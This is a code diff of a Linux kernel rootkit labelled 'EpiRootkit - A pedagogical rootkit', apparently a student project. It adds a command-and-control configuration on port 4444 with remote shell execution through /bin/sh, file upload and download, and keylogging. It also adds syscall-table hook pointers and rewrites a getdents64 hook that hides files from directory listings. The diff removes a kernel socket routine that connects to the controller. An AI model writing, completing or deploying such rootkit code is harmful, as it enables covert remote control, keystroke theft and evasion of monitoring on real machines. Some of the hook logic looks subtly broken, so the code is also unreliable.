@@ -29,82 +29,55 @@ MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
 MODULE_VERSION("0.1");
 
 // Global variables
+struct rootkit_config config = {
+    .port = 4444,
+    .server_ip = "127.0.0.1",
+    .buffer_size = 4096,
+    .xor_key = "epita",
+    .temp_output_file = "/tmp/rootkit_output",
+    .command_prefix_auth = "AUTH",
+    .command_prefix_exec = "EXEC",
+    .command_prefix_upload = "UPLOAD",
+    .command_prefix_download = "DOWNLOAD",
+    .command_prefix_keylog = "KEYLOG",
+    .command_prefix_length = 4,
+    .shell_path = "/bin/sh",
+    .shell_args = "-c",
+    .path_env = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    .hidden_dir = ".hidden",
+    .max_hidden_lines = 100,
+    .command_prefix_hide_line = "HIDE",
+    .command_prefix_unhide_line = "UNHIDE"
+};
+
+struct keylog_config keylog_config = {
+    .buffer_size = 1024,
+    .flush_interval = HZ * 5  // 5 seconds
+};
+
+struct memory_manager mem_manager = {
+    .nonpaged_memory = NULL,
+    .size = 0,
+    .lock = __SPIN_LOCK_UNLOCKED(mem_manager.lock)
+};
+
+struct network_manager net_manager = {
+    .connection = NULL,
+    .is_connected = false,
+    .lock = __SPIN_LOCK_UNLOCKED(net_manager.lock),
+    .thread = NULL
+};
+
 struct list_head dkom_entries = LIST_HEAD_INIT(dkom_entries);
 struct list_head hook_entries = LIST_HEAD_INIT(hook_entries);
 DEFINE_SPINLOCK(hook_lock);
+DEFINE_SPINLOCK(dkom_lock);
 
-struct rootkit_config {
-    int port;
-    const char *server_ip;
-    int buffer_size;
-    const char *xor_key;
-    const char *temp_output_file;
-    const char *command_prefix_auth;
-    const char *command_prefix_exec;
-    const char *command_prefix_upload;
-    const char *command_prefix_download;
-    const char *command_prefix_keylog;
-    int command_prefix_length;
-    const char *shell_path;
-    const char *shell_args;
-    const char *path_env;
-    const char *hidden_dir;
-    int max_hidden_lines;
-    const char *command_prefix_hide_line;
-    const char *command_prefix_unhide_line;
-};
-
-static struct network_manager net_manager = {
-};
-
-static int establish_connection(void) {
-    struct sockaddr_in server_addr;
-    int ret;
-    unsigned long flags;
-    
-    spin_lock_irqsave(&net_manager.lock, flags);
-    
-    if (net_manager.is_connected) {
-        spin_unlock_irqrestore(&net_manager.lock, flags);
-        return 0;
-    }
-    
-    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &net_manager.connection);
-    if (ret < 0) {
-        spin_unlock_irqrestore(&net_manager.lock, flags);
-        return ret;
-    }
-    
-    memset(&server_addr, 0, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(config.port);
-    in4_pton(config.server_ip, -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);
-    
-    ret = kernel_connect(net_manager.connection, (struct sockaddr *)&server_addr,
-                        sizeof(server_addr), 0);
-    if (ret < 0) {
-        sock_release(net_manager.connection);
-        net_manager.connection = NULL;
-    } else {
-        net_manager.is_connected = true;
-        g_connection_socket = net_manager.connection;
-    }
-    
-    spin_unlock_irqrestore(&net_manager.lock, flags);
-    return ret;
-}
-
-struct keylog_entry {
-    char key;
-    unsigned long timestamp;
-};
-
-struct keylog_buffer {
-    struct keylog_entry entries[keylog_config.buffer_size];
-    unsigned int head;
-    unsigned int tail;
-    spinlock_t lock;
-};
+struct task_struct *g_stealth_thread = NULL;
+unsigned long *sys_call_table = NULL;
+asmlinkage long (*original_getdents64)(const struct pt_regs *) = NULL;
+asmlinkage long (*original_read)(const struct pt_regs *) = NULL;
+asmlinkage long (*original_write)(const struct pt_regs *) = NULL;
 
 static struct socket *g_connection_socket = NULL;
 static struct task_struct *g_rootkit_thread = NULL;
@@ -119,6 +92,7 @@ static void exec_and_send_output(const char *command) {
     char *output_buffer;
     int read_result;
     mm_segment_t old_fs;
+    loff_t pos = 0;
 
     output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
     if (IS_ERR(output_file)) {
@@ -136,7 +110,7 @@ static void exec_and_send_output(const char *command) {
     memset(output_buffer, 0, config.buffer_size);
     old_fs = get_fs();
     set_fs(KERNEL_DS);
-    read_result = kernel_read(output_file, output_buffer, config.buffer_size - 1, &output_file->f_pos);
+    read_result = kernel_read(output_file, output_buffer, config.buffer_size - 1, &pos);
     set_fs(old_fs);
 
     if (read_result < 0) {
@@ -212,43 +186,44 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     unsigned long off = 0;
     struct linux_dirent64 *dir, *kdirent, *prev = NULL;
     struct linux_dirent64 *current_dir, *dirent_ker = NULL;
+    unsigned long count = 0;
 
     if (ret <= 0)
         return ret;
 
-    dirent_ker = kzalloc(ret, GFP_KERNEL);
-    if (dirent_ker == NULL)
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (!kdirent)
         return ret;
 
-    if (copy_from_user(dirent_ker, dirent, ret))
-        goto done;
-
-    for (off = 0; off < ret;) {
-        dir = (void *)dirent_ker + off;
-        if (strstr(dir->d_name, config.hidden_dir)) {
-            if (dir == dirent_ker) {
-                ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
-                continue;
-            }
-            if (dir == dirent_ker + ret - dir->d_reclen) {
-                ret -= dir->d_reclen;
-                memmove(dir, (void *)dir + dir->d_reclen, ret);
-                continue;
-            }
-            if (prev) {
-                prev->d_reclen = dir->d_reclen;
-                prev->d_name = dir->d_name;
-            }
-            prev = dir;
-        }
-        off += dir->d_reclen;
+    if (copy_from_user(kdirent, dirent, ret)) {
+        kfree(kdirent);
+        return ret;
     }
 
-done:
-    if (copy_to_user(dirent, dirent_ker, ret))
-        ret = -EFAULT;
-    kfree(dirent_ker);
+    dir = kdirent;
+    while (off < ret) {
+        if (strstr(dir->d_name, config.hidden_dir)) {
+            if (prev) {
+                prev->d_reclen += dir->d_reclen;
+                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
+                ret -= dir->d_reclen;
+            } else {
+                memmove(dir, (char *)dir + dir->d_reclen, ret - off - dir->d_reclen);
+                ret -= dir->d_reclen;
+            }
+        } else {
+            prev = dir;
+            off += dir->d_reclen;
+            dir = (void *)dir + dir->d_reclen;
+        }
+    }
+
+    if (copy_to_user(dirent, kdirent, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    kfree(kdirent);
     return ret;
 }
 
